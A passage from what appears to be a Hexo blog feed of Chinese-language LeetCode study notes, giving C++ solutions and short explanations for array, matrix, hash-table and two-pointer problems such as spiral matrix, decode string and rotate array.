class="keyword">if</span>(++left&gt;right)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义左边界，即 向右一列</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="59-螺旋矩阵-II——生成n-2矩阵"><a href="#59-螺旋矩阵-II——生成n-2矩阵" class="headerlink" title="59 螺旋矩阵 II——生成n^2矩阵"></a>59 螺旋矩阵 II——生成n^2矩阵</h3><p><img src="https://img-blog.csdnimg.cn/d981e11c87b84db6a23e4d8d6f5ab5a8.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//n行，每行是一个 vector&lt;int&gt;(n)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">generateMatrix</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> up=<span class="number">0</span>,left=<span class="number">0</span>,down=n<span class="number">-1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">ans</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>,nums = n*n;</span><br><span class="line">        <span class="keyword">while</span>(count&lt;=nums)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;i++)</span><br><span class="line">                ans[up][i] = count++;</span><br><span class="line">            up++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=up;i&lt;=down;i++)</span><br><span class="line">                ans[i][right] = count++;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=right;i&gt;=left;i--)</span><br><span class="line">                ans[down][i] = count++;</span><br><span class="line">            down--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=down;i&gt;=up;i--)</span><br><span class="line">                ans[i][left] = count++;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2475-数组中不等三元组的数目"><a href="#2475-数组中不等三元组的数目" class="headerlink" title="2475 数组中不等三元组的数目"></a>2475 数组中不等三元组的数目</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力枚举</span></span><br><span class="line"><span class="comment">    O(n^3)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=j+<span class="number">1</span>;k&lt;len;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(nums[i]!=nums[j] &amp;&amp; nums[j]!=nums[k] &amp;&amp; nums[i]!=nums[k])</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  res += i*(j-i)*(len-j);</span></span><br><span class="line"><span class="comment">    排序后 相同元素一定相邻</span></span><br><span class="line"><span class="comment">    由题意可知，数组元素的相对顺序不影响结果，因此我们可以将数组 nums 从小到大进行排序。</span></span><br><span class="line"><span class="comment">    当我们以某一堆相同的数 [i,j) 作为三元组的中间元素时，这堆相同的元素的左边元素数目为 i，右边元素数目为 n−j，那么符合条件的三元组数目为：i×(j−i)×(n−j)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//先排序</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>,len=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;len;i=j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;len &amp;&amp; nums[j] == nums[i])</span><br><span class="line">                j++;</span><br><span class="line">            res += i*(j-i)*(len-j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表</span></span><br><span class="line"><span class="comment">    t = 左边可以选的数量 </span></span><br><span class="line"><span class="comment">    v = 当前数数量 </span></span><br><span class="line"><span class="comment">    (n−t−v) = 右边可选数数量 </span></span><br><span class="line"><span class="comment">    直接相乘</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; count;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x:nums)&#123;</span><br><span class="line">            count[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>,n=nums.<span class="built_in">size</span>(),t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [_,v]:count)&#123;</span><br><span class="line">            res += t*v*(n-t-v);</span><br><span class="line">            t += v;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349 两个数组的交集"></a>349 两个数组的交集</h3><p>给定两个数组 nums1 和 nums2 ，返回 它们的 <strong><em>*<strong><strong>交集</strong></strong></em>*</strong> 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	哈希表：两个集合，遍历小的那个</span></span><br><span class="line"><span class="comment">    时间：O(m+n)</span></span><br><span class="line"><span class="comment">    空间：O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set1,set2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums1)&#123;</span><br><span class="line">            set1.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums2)&#123;</span><br><span class="line">            set2.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set1,set2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set1,unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set1.<span class="built_in">size</span>() &gt; set2.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set2,set1);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:set1)&#123;<span class="comment">//该处的 set 必须是元素少的那个，减少时间复杂度</span></span><br><span class="line">            <span class="keyword">if</span>(set2.<span class="built_in">count</span>(num))<span class="comment">//如果set1 和 set2 中都有某个共同元素，则加进 intersection 中</span></span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="350-两个数组的交集-II"><a href="#350-两个数组的交集-II" class="headerlink" title="350 两个数组的交集 II"></a>350 两个数组的交集 II</h3><p>给你两个整数数组 nums1 和 nums2 ，请你以数组形式返回两数组的交集。返回结果中每个元素出现的次数，应与元素在两个数组中都出现的次数一致（如果出现次数不一致，则考虑取较小值）。可以不考虑输出结果的顺序。</p>
<p><strong>分析：</strong><br>由于同一个数字在两个数组中都可能出现多次，因此需要用哈希表存储每个数字出现的次数。对于一个数字，其在交集中出现的次数等于该数字在两个数组中出现次数的 <strong>最小值</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表</span></span><br><span class="line"><span class="comment">    时间复杂度：O(m+n)</span></span><br><span class="line"><span class="comment">    时间复杂度：O(min(m+n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersect</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">intersect</span>(nums2,nums1);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums1)&#123;<span class="comment">//nums1 是两个集合中元素较少的那个</span></span><br><span class="line">            m[num]++;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m.<span class="built_in">count</span>(num))&#123;</span><br><span class="line">                <span class="comment">//如果在哈希表中存在这个数字，则将该数字添加到答案，并减少哈希表中该数字出现的次数</span></span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">                m[num]--;</span><br><span class="line">                <span class="keyword">if</span>(m[num]==<span class="number">0</span>)</span><br><span class="line">                    m.<span class="built_in">erase</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>九、力扣-Top10</title>
    <url>/2025/12/03/%E4%B9%9D%E3%80%81Top-100/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="九、力扣-Top10"><a href="#九、力扣-Top10" class="headerlink" title="九、力扣-Top10"></a>九、力扣-Top10</h2><h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11 盛最多水的容器"></a>11 盛最多水的容器</h3><p>给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。<br>找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。<br>返回【容器可以储存的最大水量】。<br>说明：不能倾斜容器。<br><img src="https://img-blog.csdnimg.cn/4959335ebcd449c896ad603ddd3c5183.png"><br><strong>分析：</strong> 容纳的水量是由<br><strong>【水量】：两个指针指向的数字中较小值∗指针之间的距离</strong><br>如果我们移动数字较大的那个指针，那么前者「两个指针指向的数字中较小值」【不会增加】，后者「指针之间的距离」会减小，那么这个乘积会减小。<br>所以：每次需要移动 height[]值较小的那个指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> max_val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">min</span>(height[l],height[r])*(r-l);</span><br><span class="line">            <span class="comment">//if(height[r]&gt;height[l])</span></span><br><span class="line">            max_val = <span class="built_in">max</span>(max_val,tmp);<span class="comment">//更新 最大水量</span></span><br><span class="line">            <span class="keyword">if</span>(height[l]&gt;=height[r])<span class="comment">//注意：记得写上【相等】的情况，如果不写，当遇到两个指针指向的水量相同时，就不会移动，那么循环将永远无法退出，也就会出现时间超时现象</span></span><br><span class="line">                r--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(height[l]&lt;height[r])</span><br><span class="line">                l++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="394-字符串解码"><a href="#394-字符串解码" class="headerlink" title="394 字符串解码"></a>394 字符串解码</h3><p>给定一个经过编码的字符串，返回它解码后的字符串。<br>编码规则为: k[encoded_string]，表示其中方括号内部的 encoded_string 正好重复 k 次。注意 k 保证为正整数。<br>你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。<br>此外，你【可以认为原始数据不包含数字】，所有的数字只表示重复的次数 k ，例如不会出现像 3a 或 2[4] 的输入。</p>
<p><strong>分析：</strong><br>本题中可能出现括号嵌套的情况，比如 2[a2[bc]]，这种情况下我们可以先转化成 2[abcbc]，再转化成 abcbcabcbc。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;pair&lt;<span class="keyword">int</span>,string&gt;&gt; stk;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i]&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">                str += s[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                num *= <span class="number">10</span>;<span class="comment">//因为数字 不止仅仅是 个位数 </span></span><br><span class="line">                num += s[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//转整数</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(num,str));</span><br><span class="line">                num = <span class="number">0</span>;<span class="comment">//一定要清0</span></span><br><span class="line">                str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> count = stk.<span class="built_in">top</span>().first;</span><br><span class="line">                string a = stk.<span class="built_in">top</span>().second;</span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//总是忘记 弹出栈</span></span><br><span class="line">                <span class="keyword">while</span>(count--)</span><br><span class="line">                    a = a + str;</span><br><span class="line">                str = a;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="75-颜色分类"><a href="#75-颜色分类" class="headerlink" title="75 颜色分类"></a>75 颜色分类</h3><p>给定一个包含【红色、白色和蓝色】、共 n 个元素的数组 nums，原地对它们进行排序，使得相同颜色的元素相邻，并【按照红色、白色、蓝色顺序排列】。<br>我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。<br>必须在不使用库内置的 sort 函数的情况下解决这个问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接记录个数，再重新放入</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n0 = <span class="number">0</span>, n1 = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>) n0++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">1</span>) n1++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">2</span>) n2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;n0)</span><br><span class="line">                nums[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i&lt;n0+n1)</span><br><span class="line">                nums[i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nums[i] = <span class="number">2</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[r]);</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[l]);</span><br><span class="line">                i++;<span class="comment">//注意</span></span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i]==<span class="number">1</span>)</span><br><span class="line">                i++;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="189-轮转数组"><a href="#189-轮转数组" class="headerlink" title="189 轮转数组"></a>189 轮转数组</h3><p>给定一个整数数组 nums，将数组中的【元素向右轮转 k 个位置】，其中 k 是非负数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//额外数组 res[(i+k)%n] = nums[i];</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> res[n];<span class="comment">//额外数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            res[(i+k)%n] = nums[i];<span class="comment">//关键！！！</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            nums[i] = res[i];<span class="comment">//z再赋给原来数组</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//nums.assign(res.begin(),res.end());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/936a1be179d44a7bb0dbfd3f4076482e.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//法二：数组翻转</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start&lt;end)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[start],nums[end]);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="built_in">reverse</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums,<span class="number">0</span>,k<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums,k,n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238 除自身以外数组的乘积"></a>238 除自身以外数组的乘积</h3><p>给你一个整数数组 nums，返回 数组 answer ，其中 answer[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积 。<br>题目数据 保证 数组 nums之中任意元素的全部前缀元素和后缀的乘积都在  32 位 整数范围内。<br>请不要使用除法，且在 O(n) 时间复杂度内完成此题。</p>
<p><strong>分析：使用除法运算</strong><br>这似乎是一个简单的问题，可以在线性时间和空间内解决。先计算给定数组所有元素的乘积，然后对数组中的每个元素 x，将总的乘积除以 x 来求得除自身值的以外数组的乘积。<br>然而这样的解决方法有一个问题，就是如果输入数组中出现 0，那么这个方法就失效了。而且在问题中说明了<code>不允许使用除法运算</code>。这增加了这个问题的难度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">productExceptSelf</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">L</span><span class="params">(len,<span class="number">0</span>)</span>, <span class="title">R</span><span class="params">(len,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(len)</span></span>;</span><br><span class="line">        <span class="comment">// L[i] ：索引 i 左侧所有元素的乘积</span></span><br><span class="line">        L[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)</span><br><span class="line">            L[i] = nums[i<span class="number">-1</span>] * L[i<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">// R[i] ：索引 i 右侧所有元素的乘积</span></span><br><span class="line">        R[len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=len<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">            R[i] = nums[i+<span class="number">1</span>] * R[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">            res[i] = L[i]*R[i];<span class="comment">//结果</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="73-矩阵置零"><a href="#73-矩阵置零" class="headerlink" title="73 矩阵置零"></a>73 矩阵置零</h3><p>给定一个 m x n 的矩阵，如果一个元素为 0 ，则将其所在行和列的所有元素都设为 0 。请使用 原地 算法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vector&lt;pair&lt;int,int&gt;&gt; vec;//存所有 0元素的下标</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setZeroes</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.<span class="built_in">size</span>(); <span class="comment">//m行 这里注意不要-1</span></span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>(); <span class="comment">//n列</span></span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; vec;<span class="comment">//存所有 0元素的下标</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]==<span class="number">0</span>)</span><br><span class="line">                    vec.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(i,j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span 